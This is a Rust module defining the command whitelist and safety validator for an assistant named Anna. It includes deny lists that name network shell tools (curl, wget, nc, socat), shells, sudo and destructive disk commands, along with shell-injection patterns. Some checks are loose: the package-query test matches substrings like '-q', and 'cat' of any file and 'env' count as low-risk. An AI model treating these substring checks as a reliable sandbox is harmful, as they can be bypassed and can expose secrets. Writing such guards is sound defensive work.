//! Command Whitelist v0.50.0
//!
//! This module defines the ONLY commands Anna is allowed to execute.
//! No arbitrary shell commands are permitted - only whitelisted commands.
//!
//! Design Philosophy:
//! - Whitelist is defined in Rust, compiled into the binary
//! - LLM cannot bypass it - this is a hard security boundary
//! - Commands are parameterized (e.g., `pacman -Q {package}`)
//! - Risk levels determine approval flow
//!
//! v0.50.0 Additions:
//! - SafetyLevel enum (read_only, low_risk, dangerous)
//! - 11 safe command categories for generic probe support
//! - Dangerous command blacklist (never execute)
//! - is_command_safe() for validating arbitrary commands

use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};

// ============================================================================
// v0.50.0 Safety Level Classification
// ============================================================================

/// Safety level for arbitrary commands (v0.50.0)
/// Used by the generic `system.command.run` probe
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SafetyLevel {
    /// Read-only commands that cannot modify system state
    ReadOnly,
    /// Low-risk commands that have minimal side effects
    LowRisk,
    /// Dangerous commands that should NEVER be executed
    Dangerous,
}

impl SafetyLevel {
    pub fn as_str(&self) -> &'static str {
        match self {
            SafetyLevel::ReadOnly => "read_only",
            SafetyLevel::LowRisk => "low_risk",
            SafetyLevel::Dangerous => "dangerous",
        }
    }

    pub fn indicator(&self) -> &'static str {
        match self {
            SafetyLevel::ReadOnly => "[R]",
            SafetyLevel::LowRisk => "[L]",
            SafetyLevel::Dangerous => "[X]",
        }
    }

    /// Can this command be auto-executed without user confirmation?
    pub fn can_auto_execute(&self) -> bool {
        matches!(self, SafetyLevel::ReadOnly | SafetyLevel::LowRisk)
    }
}

// ============================================================================
// Safe Command Validator (v0.50.0)
// ============================================================================

/// Validate if an arbitrary command is safe to execute
pub struct SafeCommandValidator {
    /// Read-only commands (auto-execute)
    read_only_commands: HashSet<&'static str>,
    /// Low-risk commands (auto-execute)
    low_risk_commands: HashSet<&'static str>,
    /// Dangerous commands (NEVER execute)
    dangerous_commands: HashSet<&'static str>,
    /// Dangerous argument patterns
    dangerous_patterns: Vec<&'static str>,
}

impl SafeCommandValidator {
    pub fn new() -> Self {
        Self {
            // 1. File Inspection (read-only)
            // 2. Shell Builtins (read-only)
            // 3. File Reading (read-only)
            // 4. Text Processing (read-only mode)
            // 5. Searching (read-only)
            // 6. System Info (read-only)
            // 7. Package Queries (read-only)
            // 8. Networking (read-only)
            // 9. Archives (list/read only)
            // 10. Shell Infrastructure (read-only)
            // 11. Hardware Queries (read-only)
            read_only_commands: [
                // File Inspection
                "ls", "file", "stat", "wc", "du", "realpath", "dirname", "basename",
                // Shell Builtins
                "pwd", "echo", "type", "which", "true", "false",
                // File Reading
                "cat", "head", "tail", "less", "more", "xxd", "od", "strings",
                // Text Processing (read-only variants)
                "grep", "awk", "cut", "sort", "uniq", "tr", "wc", "diff", "comm",
                // Searching
                "find", "locate", "whereis", "whatis", "apropos",
                // System Info
                "uname", "hostname", "uptime", "date", "timedatectl", "hostnamectl",
                "id", "whoami", "groups", "last", "w", "users",
                // Hardware Queries
                "lscpu", "lsblk", "lspci", "lsusb", "lsmod", "lshw",
                "free", "df", "mount", "blkid", "fdisk", "parted",
                "dmidecode", "hwinfo", "inxi", "sensors",
                // Networking (read-only)
                "ip", "ss", "netstat", "route", "arp", "host", "dig", "nslookup",
                "ping", "traceroute", "mtr", "ifconfig",
                // Archives (list only)
                "tar", "unzip", "zcat", "gunzip", "gzip", "bzip2", "xz",
                "zipinfo", "unrar", "7z",
                // Shell Infrastructure
                "env", "printenv", "locale", "getconf", "ulimit",
                // Package Queries
                "pacman", "apt", "apt-cache", "dpkg", "rpm", "dnf", "yum",
                "pip", "npm", "cargo", "gem", "brew",
                // Process Info
                "ps", "top", "htop", "pgrep", "pidof",
                // Misc read-only
                "man", "info", "help", "version", "getent",
                "dmesg", "journalctl", "systemctl",
                // Ollama (read-only)
                "ollama",
            ].into_iter().collect(),

            // Low-risk commands (may have limited side effects but safe)
            low_risk_commands: [
                "touch", "mkdir", "tee",  // Create only, no overwrite
            ].into_iter().collect(),

            // DANGEROUS - NEVER EXECUTE
            dangerous_commands: [
                // Destructive file operations
                "rm", "rmdir", "unlink", "shred",
                // File modification
                "mv", "cp", "ln", "chmod", "chown", "chgrp", "chattr",
                // Disk operations
                "dd", "mkfs", "mkswap", "fsck", "e2fsck", "tune2fs",
                "gdisk", "cfdisk", "sfdisk", "wipefs",
                // System control
                "reboot", "shutdown", "poweroff", "halt", "init",
                // Process control
                "kill", "pkill", "killall", "skill", "xkill",
                // Network modification
                "iptables", "ip6tables", "nft", "ufw", "firewalld",
                // User/group modification
                "useradd", "userdel", "usermod", "groupadd", "groupdel", "groupmod",
                "passwd", "chpasswd", "su", "sudo",
                // Package installation (state-changing)
                "pacman", "apt-get", "apt", "dpkg", "rpm", "dnf", "yum",
                "pip", "npm", "cargo", "gem", "brew",
                // Service control
                "systemctl", "service", "rc-service",
                // Dangerous shells/execution
                "sh", "bash", "zsh", "fish", "eval", "exec", "source",
                "python", "python3", "perl", "ruby", "node",
                // Network downloads
                "wget", "curl", "nc", "netcat", "ncat", "socat",
                // Archive extraction (can overwrite)
                "tar", "unzip", "gunzip", "bunzip2", "unxz", "unrar", "7z",
            ].into_iter().collect(),

            // Dangerous argument patterns (reject if found)
            dangerous_patterns: vec![
                // Shell metacharacters that enable injection
                ";", "&&", "||", "|", "`", "$(",
                // Redirection (can overwrite files)
                ">", ">>", "<",
                // State-changing flags
                "-S", "--sync", "-R", "--remove", "-U", "--upgrade",
                "--install", "--uninstall", "--delete", "--force",
                "-rf", "-fr", "--recursive",
                // sudo/su
                "sudo", "su -",
            ],
        }
    }

    /// Check if a command is safe to execute
    /// Returns SafetyLevel::Dangerous if command should be blocked
    pub fn classify(&self, command: &str) -> SafetyLevel {
        let parts: Vec<&str> = command.split_whitespace().collect();
        if parts.is_empty() {
            return SafetyLevel::Dangerous;
        }

        let base_cmd = parts[0];

        // Check for shell metacharacters FIRST (injection prevention)
        // These patterns should ALWAYS block, regardless of command
        let injection_patterns = [";", "&&", "||", "|", "`", "$(", ">", ">>", "<"];
        for pattern in &injection_patterns {
            if command.contains(pattern) {
                return SafetyLevel::Dangerous;
            }
        }

        // Special handling for commands with both safe and dangerous modes
        // Check these BEFORE generic dangerous patterns
        if base_cmd == "pacman" || base_cmd == "apt" || base_cmd == "apt-get" ||
           base_cmd == "apt-cache" || base_cmd == "dpkg" ||
           base_cmd == "dnf" || base_cmd == "yum" || base_cmd == "pip" ||
           base_cmd == "npm" || base_cmd == "cargo" || base_cmd == "gem" ||
           base_cmd == "brew" {
            // Only allow query operations
            if self.is_package_query(command) {
                return SafetyLevel::ReadOnly;
            }
            return SafetyLevel::Dangerous;
        }

        // systemctl: only allow status/list operations
        if base_cmd == "systemctl" {
            if self.is_systemctl_safe(command) {
                return SafetyLevel::ReadOnly;
            }
            return SafetyLevel::Dangerous;
        }

        // tar: only allow listing, not extraction
        if base_cmd == "tar" {
            if self.is_tar_list_only(command) {
                return SafetyLevel::ReadOnly;
            }
            return SafetyLevel::Dangerous;
        }

        // Check remaining dangerous patterns (state-changing flags)
        let state_changing_patterns = [
            "-S", "--sync", "-R", "--remove", "-U", "--upgrade",
            "--install", "--uninstall", "--delete", "--force",
            "-rf", "-fr", "--recursive", "sudo", "su -",
        ];
        for pattern in &state_changing_patterns {
            if command.contains(pattern) {
                return SafetyLevel::Dangerous;
            }
        }

        // Check base command safety
        if self.dangerous_commands.contains(base_cmd) {
            return SafetyLevel::Dangerous;
        }

        if self.read_only_commands.contains(base_cmd) {
            return SafetyLevel::ReadOnly;
        }

        if self.low_risk_commands.contains(base_cmd) {
            return SafetyLevel::LowRisk;
        }

        // Unknown command - be safe, reject
        SafetyLevel::Dangerous
    }

    /// Check if a command is safe to auto-execute
    pub fn is_safe(&self, command: &str) -> bool {
        self.classify(command).can_auto_execute()
    }

    /// Check if a package manager command is a safe query operation
    fn is_package_query(&self, command: &str) -> bool {
        let lower = command.to_lowercase();

        // pacman query flags
        if lower.contains("-q") || lower.contains("--query") ||
           lower.contains("-si") || lower.contains("--search") ||
           lower.contains("-ss") {
            return true;
        }

        // apt/apt-cache query flags
        if lower.contains("show") || lower.contains("search") ||
           lower.contains("list") || lower.contains("policy") ||
           lower.contains("depends") || lower.contains("rdepends") {
            // Make sure it's not apt-get install etc.
            if !lower.contains("install") && !lower.contains("remove") &&
               !lower.contains("upgrade") && !lower.contains("purge") {
                return true;
            }
        }

        // pip/npm query
        if lower.contains("list") || lower.contains("show") ||
           lower.contains("search") || lower.contains("info") {
            return true;
        }

        false
    }

    /// Check if systemctl command is safe (status/list only)
    fn is_systemctl_safe(&self, command: &str) -> bool {
        let lower = command.to_lowercase();

        // Safe operations
        if lower.contains("status") || lower.contains("is-active") ||
           lower.contains("is-enabled") || lower.contains("list-units") ||
           lower.contains("list-unit-files") || lower.contains("show") ||
           lower.contains("cat") {
            return true;
        }

        // Dangerous operations
        if lower.contains("start") || lower.contains("stop") ||
           lower.contains("restart") || lower.contains("enable") ||
           lower.contains("disable") || lower.contains("mask") ||
           lower.contains("unmask") || lower.contains("daemon-reload") {
            return false;
        }

        false
    }

    /// Check if tar command is list-only (not extracting)
    fn is_tar_list_only(&self, command: &str) -> bool {
        // -t or --list is safe
        command.contains("-t") || command.contains("--list")
    }

    /// Get a human-readable explanation of why a command was blocked
    pub fn explain_block(&self, command: &str) -> String {
        let parts: Vec<&str> = command.split_whitespace().collect();
        if parts.is_empty() {
            return "Empty command".to_string();
        }

        let base_cmd = parts[0];

        // Check injection patterns first
        let injection_patterns = [";", "&&", "||", "|", "`", "$(", ">", ">>", "<"];
        for pattern in &injection_patterns {
            if command.contains(pattern) {
                return format!(
                    "Command contains dangerous pattern '{}' which could enable \
                     shell injection or file modification.",
                    pattern
                );
            }
        }

        // Check dangerous base command
        if self.dangerous_commands.contains(base_cmd) {
            return format!(
                "The command '{}' can modify or damage your system. \
                 Anna only executes read-only commands for safety.",
                base_cmd
            );
        }

        // Check state-changing patterns
        let state_changing_patterns = [
            "-rf", "-fr", "--recursive", "-S", "--sync", "-R", "--remove",
            "-U", "--upgrade", "--install", "--uninstall", "--delete", "--force",
            "sudo", "su -",
        ];
        for pattern in &state_changing_patterns {
            if command.contains(pattern) {
                return format!(
                    "Command contains dangerous pattern '{}' which could modify system state.",
                    pattern
                );
            }
        }

        "Unknown command - not in safe command list".to_string()
    }
}

impl Default for SafeCommandValidator {
    fn default() -> Self {
        Self::new()
    }
}

// ============================================================================
// Risk Classification (Legacy)
// ============================================================================

/// Risk level for whitelisted commands
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CommandRisk {
    /// Safe read-only command, no side effects (auto-approve)
    Low,
    /// Read-only but may be slow or access semi-sensitive data
    Medium,
    /// State-changing operation (requires user confirmation)
    High,
}

impl CommandRisk {
    pub fn as_str(&self) -> &'static str {
        match self {
            CommandRisk::Low => "low",
            CommandRisk::Medium => "medium",
            CommandRisk::High => "high",
        }
    }

    pub fn indicator(&self) -> &'static str {
        match self {
            CommandRisk::Low => "[+]",
            CommandRisk::Medium => "[~]",
            CommandRisk::High => "[!]",
        }
    }

    /// Does this risk level require user confirmation?
    pub fn requires_confirmation(&self) -> bool {
        matches!(self, CommandRisk::High)
    }

    /// Can this command be auto-approved in normal mode?
    pub fn auto_approve_normal(&self) -> bool {
        matches!(self, CommandRisk::Low)
    }

    /// Can this command be auto-approved in dev mode?
    pub fn auto_approve_dev(&self) -> bool {
        matches!(self, CommandRisk::Low | CommandRisk::Medium)
    }
}

// ============================================================================
// Whitelisted Command Definition
// ============================================================================

/// A command in the whitelist
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WhitelistedCommand {
    /// Unique identifier (e.g., "cpu_info", "pkg_query")
    pub id: &'static str,
    /// Human-readable description
    pub description: &'static str,
    /// The command template (e.g., "pacman -Qi {package}")
    /// Parameters are in {braces}
    pub template: &'static str,
    /// Risk classification
    pub risk: CommandRisk,
    /// Category for grouping
    pub category: CommandCategory,
    /// Maximum execution time in seconds
    pub timeout_secs: u64,
    /// Expected output format
    pub output_format: OutputFormat,
}

/// Command categories
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CommandCategory {
    /// System hardware info
    Hardware,
    /// Memory and storage
    Storage,
    /// Network configuration
    Network,
    /// Package management (queries)
    PackageQuery,
    /// Package management (installs)
    PackageInstall,
    /// Service management
    Service,
    /// File operations (read)
    FileRead,
    /// File operations (write)
    FileWrite,
    /// Process and resource info
    Process,
    /// Configuration files
    Config,
}

impl CommandCategory {
    pub fn as_str(&self) -> &'static str {
        match self {
            CommandCategory::Hardware => "hardware",
            CommandCategory::Storage => "storage",
            CommandCategory::Network => "network",
            CommandCategory::PackageQuery => "package_query",
            CommandCategory::PackageInstall => "package_install",
            CommandCategory::Service => "service",
            CommandCategory::FileRead => "file_read",
            CommandCategory::FileWrite => "file_write",
            CommandCategory::Process => "process",
            CommandCategory::Config => "config",
        }
    }

    pub fn indicator(&self) -> &'static str {
        match self {
            CommandCategory::Hardware => "[H]",
            CommandCategory::Storage => "[S]",
            CommandCategory::Network => "[N]",
            CommandCategory::PackageQuery => "[Q]",
            CommandCategory::PackageInstall => "[I]",
            CommandCategory::Service => "[V]",
            CommandCategory::FileRead => "[R]",
            CommandCategory::FileWrite => "[W]",
            CommandCategory::Process => "[P]",
            CommandCategory::Config => "[C]",
        }
    }
}

/// Expected output format
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum OutputFormat {
    /// JSON output (parseable)
    Json,
    /// Plain text
    Text,
    /// Key-value pairs
    KeyValue,
    /// Table format
    Table,
    /// Binary/status only (exit code matters)
    Status,
}

// ============================================================================
// The Whitelist (Static, Compiled-in)
// ============================================================================

/// The complete command whitelist - defined at compile time
pub static COMMAND_WHITELIST: &[WhitelistedCommand] = &[
    // ========== Hardware Info (Low Risk) ==========
    WhitelistedCommand {
        id: "cpu_info",
        description: "CPU information (model, cores, flags)",
        template: "lscpu -J",
        risk: CommandRisk::Low,
        category: CommandCategory::Hardware,
        timeout_secs: 5,
        output_format: OutputFormat::Json,
    },
    WhitelistedCommand {
        id: "mem_info",
        description: "Memory usage statistics",
        template: "cat /proc/meminfo",
        risk: CommandRisk::Low,
        category: CommandCategory::Hardware,
        timeout_secs: 2,
        output_format: OutputFormat::KeyValue,
    },
    WhitelistedCommand {
        id: "pci_devices",
        description: "PCI devices (GPU, network cards, etc.)",
        template: "lspci",
        risk: CommandRisk::Low,
        category: CommandCategory::Hardware,
        timeout_secs: 5,
        output_format: OutputFormat::Text,
    },
    WhitelistedCommand {
        id: "usb_devices",
        description: "USB devices connected",
        template: "lsusb",
        risk: CommandRisk::Low,
        category: CommandCategory::Hardware,
        timeout_secs: 5,
        output_format: OutputFormat::Text,
    },
    // ========== Storage Info (Low Risk) ==========
    WhitelistedCommand {
        id: "disk_layout",
        description: "Block device layout (disks, partitions)",
        template: "lsblk -J -b -o NAME,SIZE,TYPE,FSTYPE,MOUNTPOINT",
        risk: CommandRisk::Low,
        category: CommandCategory::Storage,
        timeout_secs: 5,
        output_format: OutputFormat::Json,
    },
    WhitelistedCommand {
        id: "disk_usage_root",
        description: "Root filesystem usage",
        template: "df -P /",
        risk: CommandRisk::Low,
        category: CommandCategory::Storage,
        timeout_secs: 2,
        output_format: OutputFormat::Table,
    },
    WhitelistedCommand {
        id: "disk_usage_all",
        description: "All mounted filesystem usage",
        template: "df -h",
        risk: CommandRisk::Low,
        category: CommandCategory::Storage,
        timeout_secs: 5,
        output_format: OutputFormat::Table,
    },
    WhitelistedCommand {
        id: "mount_points",
        description: "Currently mounted filesystems",
        template: "mount",
        risk: CommandRisk::Low,
        category: CommandCategory::Storage,
        timeout_secs: 2,
        output_format: OutputFormat::Text,
    },
    // ========== Network Info (Low Risk) ==========
    WhitelistedCommand {
        id: "net_interfaces",
        description: "Network interface list",
        template: "ip -j link show",
        risk: CommandRisk::Low,
        category: CommandCategory::Network,
        timeout_secs: 5,
        output_format: OutputFormat::Json,
    },
    WhitelistedCommand {
        id: "net_addresses",
        description: "Network addresses (IP configuration)",
        template: "ip -j addr",
        risk: CommandRisk::Low,
        category: CommandCategory::Network,
        timeout_secs: 5,
        output_format: OutputFormat::Json,
    },
    WhitelistedCommand {
        id: "net_routes",
        description: "Routing table",
        template: "ip -j route",
        risk: CommandRisk::Low,
        category: CommandCategory::Network,
        timeout_secs: 5,
        output_format: OutputFormat::Json,
    },
    WhitelistedCommand {
        id: "dns_config",
        description: "DNS resolver configuration",
        template: "cat /etc/resolv.conf",
        risk: CommandRisk::Low,
        category: CommandCategory::Network,
        timeout_secs: 2,
        output_format: OutputFormat::Text,
    },
    WhitelistedCommand {
        id: "net_connections",
        description: "Active network connections",
        template: "ss -tuln",
        risk: CommandRisk::Low,
        category: CommandCategory::Network,
        timeout_secs: 5,
        output_format: OutputFormat::Table,
    },
    // ========== Package Queries (Low Risk) ==========
    WhitelistedCommand {
        id: "pkg_query",
        description: "Query if a specific package is installed",
        template: "pacman -Qi {package}",
        risk: CommandRisk::Low,
        category: CommandCategory::PackageQuery,
        timeout_secs: 5,
        output_format: OutputFormat::KeyValue,
    },
    WhitelistedCommand {
        id: "pkg_list_installed",
        description: "List all installed packages",
        template: "pacman -Q",
        risk: CommandRisk::Low,
        category: CommandCategory::PackageQuery,
        timeout_secs: 10,
        output_format: OutputFormat::Table,
    },
    WhitelistedCommand {
        id: "pkg_search",
        description: "Search for packages in repos",
        template: "pacman -Ss {pattern}",
        risk: CommandRisk::Low,
        category: CommandCategory::PackageQuery,
        timeout_secs: 15,
        output_format: OutputFormat::Text,
    },
    WhitelistedCommand {
        id: "pkg_files",
        description: "List files owned by a package",
        template: "pacman -Ql {package}",
        risk: CommandRisk::Low,
        category: CommandCategory::PackageQuery,
        timeout_secs: 10,
        output_format: OutputFormat::Text,
    },
    WhitelistedCommand {
        id: "pkg_owner",
        description: "Find which package owns a file",
        template: "pacman -Qo {filepath}",
        risk: CommandRisk::Low,
        category: CommandCategory::PackageQuery,
        timeout_secs: 5,
        output_format: OutputFormat::Text,
    },
    // ========== Package Install (High Risk) ==========
    WhitelistedCommand {
        id: "pkg_install",
        description: "Install a package",
        template: "sudo pacman -S --noconfirm {package}",
        risk: CommandRisk::High,
        category: CommandCategory::PackageInstall,
        timeout_secs: 300,
        output_format: OutputFormat::Text,
    },
    WhitelistedCommand {
        id: "pkg_remove",
        description: "Remove a package",
        template: "sudo pacman -R --noconfirm {package}",
        risk: CommandRisk::High,
        category: CommandCategory::PackageInstall,
        timeout_secs: 120,
        output_format: OutputFormat::Text,
    },
    WhitelistedCommand {
        id: "pkg_update_db",
        description: "Update package database",
        template: "sudo pacman -Sy",
        risk: CommandRisk::High,
        category: CommandCategory::PackageInstall,
        timeout_secs: 120,
        output_format: OutputFormat::Text,
    },
    // ========== Service Management (Medium/High Risk) ==========
    WhitelistedCommand {
        id: "svc_status",
        description: "Check status of a systemd service",
        template: "systemctl status {service}",
        risk: CommandRisk::Low,
        category: CommandCategory::Service,
        timeout_secs: 10,
        output_format: OutputFormat::Text,
    },
    WhitelistedCommand {
        id: "svc_list",
        description: "List running systemd services",
        template: "systemctl list-units --type=service --state=running",
        risk: CommandRisk::Low,
        category: CommandCategory::Service,
        timeout_secs: 10,
        output_format: OutputFormat::Table,
    },
    WhitelistedCommand {
        id: "svc_start",
        description: "Start a systemd service",
        template: "sudo systemctl start {service}",
        risk: CommandRisk::High,
        category: CommandCategory::Service,
        timeout_secs: 30,
        output_format: OutputFormat::Status,
    },
    WhitelistedCommand {
        id: "svc_stop",
        description: "Stop a systemd service",
        template: "sudo systemctl stop {service}",
        risk: CommandRisk::High,
        category: CommandCategory::Service,
        timeout_secs: 30,
        output_format: OutputFormat::Status,
    },
    WhitelistedCommand {
        id: "svc_restart",
        description: "Restart a systemd service",
        template: "sudo systemctl restart {service}",
        risk: CommandRisk::High,
        category: CommandCategory::Service,
        timeout_secs: 60,
        output_format: OutputFormat::Status,
    },
    WhitelistedCommand {
        id: "svc_enable",
        description: "Enable a systemd service at boot",
        template: "sudo systemctl enable {service}",
        risk: CommandRisk::High,
        category: CommandCategory::Service,
        timeout_secs: 10,
        output_format: OutputFormat::Status,
    },
    // ========== File Read Operations (Low Risk) ==========
    WhitelistedCommand {
        id: "file_read",
        description: "Read contents of a file",
        template: "cat {filepath}",
        risk: CommandRisk::Low,
        category: CommandCategory::FileRead,
        timeout_secs: 5,
        output_format: OutputFormat::Text,
    },
    WhitelistedCommand {
        id: "file_head",
        description: "Read first N lines of a file",
        template: "head -n {lines} {filepath}",
        risk: CommandRisk::Low,
        category: CommandCategory::FileRead,
        timeout_secs: 5,
        output_format: OutputFormat::Text,
    },
    WhitelistedCommand {
        id: "file_tail",
        description: "Read last N lines of a file",
        template: "tail -n {lines} {filepath}",
        risk: CommandRisk::Low,
        category: CommandCategory::FileRead,
        timeout_secs: 5,
        output_format: OutputFormat::Text,
    },
    WhitelistedCommand {
        id: "file_exists",
        description: "Check if a file or directory exists",
        template: "ls -la {filepath}",
        risk: CommandRisk::Low,
        category: CommandCategory::FileRead,
        timeout_secs: 2,
        output_format: OutputFormat::Text,
    },
    WhitelistedCommand {
        id: "file_find",
        description: "Find files by name pattern",
        template: "find {directory} -name {pattern} -maxdepth 3 2>/dev/null",
        risk: CommandRisk::Low,
        category: CommandCategory::FileRead,
        timeout_secs: 30,
        output_format: OutputFormat::Text,
    },
    WhitelistedCommand {
        id: "file_grep",
        description: "Search for pattern in file",
        template: "grep -n {pattern} {filepath}",
        risk: CommandRisk::Low,
        category: CommandCategory::FileRead,
        timeout_secs: 10,
        output_format: OutputFormat::Text,
    },
    // ========== File Write Operations (High Risk) ==========
    WhitelistedCommand {
        id: "file_backup",
        description: "Create backup of a file",
        template: "cp {filepath} {filepath}.anna.bak",
        risk: CommandRisk::Medium,
        category: CommandCategory::FileWrite,
        timeout_secs: 10,
        output_format: OutputFormat::Status,
    },
    WhitelistedCommand {
        id: "file_append",
        description: "Append line to a file",
        template: "echo {content} >> {filepath}",
        risk: CommandRisk::High,
        category: CommandCategory::FileWrite,
        timeout_secs: 5,
        output_format: OutputFormat::Status,
    },
    WhitelistedCommand {
        id: "file_mkdir",
        description: "Create a directory",
        template: "mkdir -p {directory}",
        risk: CommandRisk::Medium,
        category: CommandCategory::FileWrite,
        timeout_secs: 5,
        output_format: OutputFormat::Status,
    },
    // ========== Process Info (Low Risk) ==========
    WhitelistedCommand {
        id: "proc_list",
        description: "List running processes",
        template: "ps aux",
        risk: CommandRisk::Low,
        category: CommandCategory::Process,
        timeout_secs: 5,
        output_format: OutputFormat::Table,
    },
    WhitelistedCommand {
        id: "proc_top",
        description: "Top processes by CPU/memory",
        template: "ps aux --sort=-%cpu | head -20",
        risk: CommandRisk::Low,
        category: CommandCategory::Process,
        timeout_secs: 5,
        output_format: OutputFormat::Table,
    },
    WhitelistedCommand {
        id: "proc_uptime",
        description: "System uptime and load",
        template: "uptime",
        risk: CommandRisk::Low,
        category: CommandCategory::Process,
        timeout_secs: 2,
        output_format: OutputFormat::Text,
    },
    WhitelistedCommand {
        id: "proc_who",
        description: "Who is logged in",
        template: "who",
        risk: CommandRisk::Low,
        category: CommandCategory::Process,
        timeout_secs: 2,
        output_format: OutputFormat::Table,
    },
    // ========== Config Files (Low Risk Read) ==========
    WhitelistedCommand {
        id: "config_os_release",
        description: "OS release information",
        template: "cat /etc/os-release",
        risk: CommandRisk::Low,
        category: CommandCategory::Config,
        timeout_secs: 2,
        output_format: OutputFormat::KeyValue,
    },
    WhitelistedCommand {
        id: "config_hostname",
        description: "System hostname",
        template: "hostname",
        risk: CommandRisk::Low,
        category: CommandCategory::Config,
        timeout_secs: 2,
        output_format: OutputFormat::Text,
    },
    WhitelistedCommand {
        id: "config_timezone",
        description: "System timezone",
        template: "timedatectl",
        risk: CommandRisk::Low,
        category: CommandCategory::Config,
        timeout_secs: 5,
        output_format: OutputFormat::KeyValue,
    },
    WhitelistedCommand {
        id: "config_locale",
        description: "System locale settings",
        template: "locale",
        risk: CommandRisk::Low,
        category: CommandCategory::Config,
        timeout_secs: 2,
        output_format: OutputFormat::KeyValue,
    },
    WhitelistedCommand {
        id: "config_env",
        description: "Environment variables",
        template: "env",
        risk: CommandRisk::Low,
        category: CommandCategory::Config,
        timeout_secs: 2,
        output_format: OutputFormat::KeyValue,
    },
    // ========== Ollama LLM (Medium Risk - Resource Intensive) ==========
    WhitelistedCommand {
        id: "ollama_list",
        description: "List installed Ollama models",
        template: "ollama list",
        risk: CommandRisk::Low,
        category: CommandCategory::Process,
        timeout_secs: 10,
        output_format: OutputFormat::Table,
    },
    WhitelistedCommand {
        id: "ollama_ps",
        description: "List running Ollama models",
        template: "ollama ps",
        risk: CommandRisk::Low,
        category: CommandCategory::Process,
        timeout_secs: 10,
        output_format: OutputFormat::Table,
    },
];

// ============================================================================
// Whitelist Registry
// ============================================================================

/// Registry for looking up and validating commands
pub struct CommandRegistry {
    by_id: HashMap<&'static str, &'static WhitelistedCommand>,
    by_category: HashMap<CommandCategory, Vec<&'static WhitelistedCommand>>,
}

impl CommandRegistry {
    /// Create a new registry from the static whitelist
    pub fn new() -> Self {
        let mut by_id = HashMap::new();
        let mut by_category: HashMap<CommandCategory, Vec<&'static WhitelistedCommand>> =
            HashMap::new();

        for cmd in COMMAND_WHITELIST {
            by_id.insert(cmd.id, cmd);
            by_category.entry(cmd.category).or_default().push(cmd);
        }

        Self { by_id, by_category }
    }

    /// Look up a command by ID
    pub fn get(&self, id: &str) -> Option<&'static WhitelistedCommand> {
        self.by_id.get(id).copied()
    }

    /// Get all commands in a category
    pub fn by_category(&self, category: CommandCategory) -> Vec<&'static WhitelistedCommand> {
        self.by_category.get(&category).cloned().unwrap_or_default()
    }

    /// Get all low-risk commands (safe to auto-run)
    pub fn low_risk_commands(&self) -> Vec<&'static WhitelistedCommand> {
        COMMAND_WHITELIST
            .iter()
            .filter(|c| c.risk == CommandRisk::Low)
            .collect()
    }

    /// Get all commands
    pub fn all(&self) -> &[WhitelistedCommand] {
        COMMAND_WHITELIST
    }

    /// Check if a raw command matches any whitelist entry
    pub fn matches_whitelist(&self, raw_command: &str) -> Option<CommandMatch> {
        for cmd in COMMAND_WHITELIST {
            if let Some(params) = self.match_template(cmd.template, raw_command) {
                return Some(CommandMatch {
                    command: cmd,
                    parameters: params,
                });
            }
        }
        None
    }

    /// Try to match a raw command against a template
    fn match_template(&self, template: &str, raw_command: &str) -> Option<HashMap<String, String>> {
        // Simple template matching: {param} placeholders
        let mut params = HashMap::new();

        // Extract template parts
        let template_parts: Vec<&str> = template.split_whitespace().collect();
        let command_parts: Vec<&str> = raw_command.split_whitespace().collect();

        // Base command must match (before any {param})
        if template_parts.is_empty() || command_parts.is_empty() {
            return None;
        }

        // Check if base command matches
        let mut template_idx = 0;
        let mut command_idx = 0;

        while template_idx < template_parts.len() && command_idx < command_parts.len() {
            let tpart = template_parts[template_idx];
            let cpart = command_parts[command_idx];

            if tpart.starts_with('{') && tpart.ends_with('}') {
                // This is a parameter placeholder
                let param_name = &tpart[1..tpart.len() - 1];
                params.insert(param_name.to_string(), cpart.to_string());
            } else if tpart != cpart {
                // Literal parts must match exactly
                return None;
            }

            template_idx += 1;
            command_idx += 1;
        }

        // Check if we consumed all parts
        if template_idx == template_parts.len() && command_idx == command_parts.len() {
            Some(params)
        } else if template_idx == template_parts.len() {
            // Template exhausted but command has more - could be optional params
            // For safety, reject this
            None
        } else {
            None
        }
    }

    /// Build a command from template and parameters
    pub fn build_command(
        &self,
        id: &str,
        params: &HashMap<String, String>,
    ) -> Result<String, WhitelistError> {
        let cmd = self
            .get(id)
            .ok_or_else(|| WhitelistError::CommandNotFound(id.to_string()))?;

        let mut result = cmd.template.to_string();

        // Replace all {param} placeholders
        for (key, value) in params {
            let placeholder = format!("{{{}}}", key);
            if !result.contains(&placeholder) {
                return Err(WhitelistError::UnknownParameter(key.clone()));
            }
            // Basic injection prevention: reject if value contains shell metacharacters
            if Self::contains_shell_metachar(value) {
                return Err(WhitelistError::UnsafeParameter(value.clone()));
            }
            result = result.replace(&placeholder, value);
        }

        // Check all placeholders were filled
        if result.contains('{') && result.contains('}') {
            return Err(WhitelistError::MissingParameter(result));
        }

        Ok(result)
    }

    /// Check for shell metacharacters that could enable injection
    fn contains_shell_metachar(s: &str) -> bool {
        // Dangerous characters that could enable command injection
        let dangerous = ['|', ';', '&', '`', '$', '(', ')', '<', '>', '\n', '\r'];
        s.chars().any(|c| dangerous.contains(&c))
    }
}

impl Default for CommandRegistry {
    fn default() -> Self {
        Self::new()
    }
}

/// Result of matching a command against the whitelist
#[derive(Debug, Clone)]
pub struct CommandMatch {
    pub command: &'static WhitelistedCommand,
    pub parameters: HashMap<String, String>,
}

/// Errors from whitelist operations
#[derive(Debug, Clone, thiserror::Error)]
pub enum WhitelistError {
    #[error("Command not in whitelist: {0}")]
    CommandNotFound(String),

    #[error("Unknown parameter: {0}")]
    UnknownParameter(String),

    #[error("Missing required parameter in: {0}")]
    MissingParameter(String),

    #[error("Unsafe parameter value (contains shell metacharacters): {0}")]
    UnsafeParameter(String),

    #[error("Command execution denied by policy")]
    DeniedByPolicy,
}

// ============================================================================
// Display implementations
// ============================================================================

impl std::fmt::Display for CommandRisk {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}  {}", self.indicator(), self.as_str())
    }
}

